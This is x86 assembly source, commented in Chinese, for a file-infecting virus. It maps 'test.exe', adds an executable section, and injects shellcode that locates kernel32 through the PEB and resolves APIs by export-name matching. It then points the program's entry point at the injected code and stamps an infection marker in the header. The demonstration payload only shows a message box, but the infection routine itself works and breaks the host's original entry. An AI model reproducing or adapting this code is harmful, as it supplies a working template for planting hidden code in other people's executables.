


	.386
	.model flat,stdcall
	option casemap:none
	
include         windows.inc
include			kernel32.inc
include			user32.inc
includelib		user32.lib
includelib		kernel32.lib

	.data
sztit			db		'NO',0
szti			db		'YES',0
szFileName		db		'test.exe',0
hFile			dd 		?
hMap			dd		?
ImageBase		dd		?
pe_Header		dd		?
NumOfSection	dw		?
Sec_align		dd		?
file_align		dd		?
NewIp			dd      ?
OldIp			dd		?	
dest			dd		?
FileSize		dd      ?

	.code
start: 
	jmp InEnd
Begin:
	jmp str_0
	vLen      =  InEnd-Begin
	appBase					dd	?
	adKernel32 			 	dd 	?
	adGetProcA     		 	dd  ?
	adMessagBox 			dd  ?
	adUser32				dd  ?
	adExitProcess			dd  ?
	adLoadLibrary   		dd	?
	szGetProcA				db  'GetProcAddress',0
	szLoadLibrary   		db  'LoadLibraryA',0
	szExitProcess			db  'ExitProcess',0
	szuer32					db  'user32.dll',0
	szMessageBox			db  'MessageBoxA',0	
	szName    				db  'First',0
	
str_0:
	call sts
sts:
	pop ebp
	sub ebp,offset sts
	mov dword ptr[ebp+appBase],ebp
	assume fs:nothing
	mov ebx,[fs:30h]              ;peb
	mov ebx,[ebx+0ch]					
	mov ebx,[ebx+1ch]
	mov ebx,[ebx]
	mov ebx,[ebx]                 ;win7   系统必须加这一行
	mov ebx,[ebx+8h]
	mov [ebp+adKernel32],ebx
	

	mov edi,[ebp+adKernel32]
	mov eax,[edi+3ch]             ;PE头
	mov edx,[eax+edi+78h]       
	add edx,edi				;ebx 输入表的地址 	
	mov ecx,[edx+18h]             ;函数数量
	mov ebx,[edx+20h]			;函数name地址
	add ebx,edi
	
search:
	dec ecx
	mov esi,[ebx+ecx*4]
	add esi,edi
	mov eax,50746547h
	cmp [esi],eax
	jne search
	mov eax,41636f72h
	cmp [esi+4],eax
	jne search
    mov ebx,[edx+24h];
    add ebx,edi;
    mov cx,[ebx+ecx*2];
    mov ebx,[edx+1ch];
    add ebx,edi;
	mov eax,[ebx+ecx*4];
    add eax,edi;
	mov [ebp+adGetProcA],eax
	
	
	
	lea  ebx,[ebp+szLoadLibrary]
	push ebx
	mov ebx,[ebp+adKernel32]
	push ebx
	call [ebp+adGetProcA]
	mov [ebp+adLoadLibrary],eax
	
	lea ebx, [ebp+szExitProcess]		;获取ExitProcess的地址
	push ebx
	mov ebx,[ebp+adKernel32]
	push ebx
	call [ebp+adGetProcA]
	mov [ebp+adExitProcess],eax
	
	lea ebx,[ebp+szuer32]				;载入User32.dll
	push ebx
	call [ebp+adLoadLibrary]
	mov [ebp+adUser32],eax
	
	lea ebx,[ebp+szMessageBox]       ;获取MessageBox 的地址
	push ebx
	mov ebx,[ebp+adUser32]
	push ebx
	call [ebp+adGetProcA]
	mov [ebp+adMessagBox],eax

	push 0h
	lea ebx,[ebp+szName]
	push ebx
	push ebx
	push 0h
	call [ebp+adMessagBox]
	push 0h
	call [ebp+adExitProcess]
InEnd:
	
	xor ebx,ebx
	push ebx
	push ebx
	push OPEN_EXISTING
	push ebx
	push ebx
	push GENERIC_READ+GENERIC_WRITE
	lea  ebx,[szFileName]
	push ebx
	call CreateFile
	inc eax
	je  Err
	dec eax
	mov hFile,eax
	
	push eax
	sub ebx,ebx
	push ebx
	push eax
	call GetFileSize
	inc eax
	je Err
	dec eax
	mov FileSize,eax
	xchg eax,ecx
	add ecx,1000h
	xor eax,eax
	push eax
	push ecx
	push eax
	push PAGE_READWRITE
	push eax
	mov eax,hFile
	push eax
	call CreateFileMapping
	test eax,eax
	je Err
	mov hMap,eax	
	
	xor eax,eax
	push eax
	push eax
	push eax
	push FILE_MAP_WRITE
	mov eax,hMap
	push eax
	call MapViewOfFile
	test eax,eax
	je Err
	mov ImageBase,eax
	
	;esi  存储基址
	mov esi,eax
	mov	ax,word ptr[esi]
	cmp ax,'ZM'
	jne Err
	mov eax,[esi+3ch]
	add eax,esi
	cmp word ptr[eax],'EP'
	jne Err
	mov pe_Header,eax
	
	mov dx,word ptr [eax+6h]
	mov NumOfSection,dx
	
	mov ecx,[eax+74h]			;ebx数据目录表的数量  
	imul ecx,ecx,8h
	lea ebx,[eax+ecx+78h]
	movzx ecx,NumOfSection
	imul ecx,ecx,28h
	add ebx,ecx				;ebx节末尾
	mov edi,ebx
	
	mov dword ptr [edi],'bsc.'  ;edi节结尾
	mov dword ptr [edi+8],vLen
	
	mov ebx,[eax+38h]         ;Section Alignment
	mov Sec_align,ebx
	mov edx,[eax+3ch]
	mov file_align,edx
	
	mov ecx,[edi-28h+0ch]   ;上一节的VirtualAddress
	mov eax,[edi-28h+8h]
	xor edx,edx
	div ebx
	test edx,edx
	je @@1
	inc eax
@@1:
	mul ebx
	add eax,ecx  ;新的节的virtualAddr
	mov [edi+0ch],eax
	mov NewIp,eax
	mov dword ptr[edi+24h],0E0000020h		;节属性
	
	mov eax,vLen
	cdq
	mov ebx,[file_align]
	div ebx
	test edx,edx
	je @@2
	inc eax
@@2:
	mul ebx
	mov dword ptr [edi+10h],eax
	mov eax,[edi-28h+14h]
	add eax,[edi-28h+10h]
	
	mov [edi+14h],eax						;write PointerToRawData
	
	mov [dest],eax	
	
	mov eax,[pe_Header]
	inc word ptr[eax+6h]			;节数量
	
	mov ebx,[eax+28h]        
	mov OldIp,ebx
	
	mov ebx,[NewIp]
	mov [eax+28h],ebx
	
	mov ebx,[eax+50h]					
	add	ebx,vLen
	mov ecx,[Sec_align]
	xor	edx,edx
	xchg eax,ebx
	cdq
	div ecx
	test edx,edx	;镜像大小处理
	je @@3
	inc	eax
@@3:
	mul ecx
	xchg eax,ebx
	
	mov [eax+50h],ebx
	
	mov dword ptr [esi+40h], 'zwsw'		;标志
	
	
	cld
	mov ecx,vLen
	mov edi,[dest]
	add edi,[ImageBase]
	lea esi,[Begin]
	rep movsb									;代码复制
	
	push [ImageBase]
	call UnmapViewOfFile
	
	push [hMap]
	call CloseHandle
	
	push [hFile]
	call CloseHandle
	jmp _End
Err:
	invoke MessageBox,NULL,offset sztit,offset sztit,MB_OK
	jmp En
_End:
	invoke MessageBox,NULL,offset szti,offset szti,MB_OK
En:
	push 0
	call ExitProcess		
end start
